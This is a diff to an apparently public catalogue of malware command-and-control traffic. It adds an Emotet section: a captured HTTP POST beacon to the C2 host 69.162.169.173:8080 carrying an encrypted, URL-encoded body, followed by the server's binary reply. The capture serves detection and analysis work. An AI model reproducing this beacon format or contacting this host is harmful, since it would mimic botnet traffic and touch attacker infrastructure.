@@ -48,6 +48,30 @@ BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCD
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")
 
+#### Emotet
+~~~
+POST /mult/tlb/ HTTP/1.1
+Referer: http://69.162.169.173/mult/tlb/
+Content-Type: application/x-www-form-urlencoded
+DNT: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: 69.162.169.173:8080
+Content-Length: 468
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipTHTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 07 Oct 2019 13:38:33 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 148
+Connection: keep-alive
+
+.^ta.I..Z .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")
+
 #### Evilpony
 Follow tcp stream, not http stream in wireshark
 ~~~
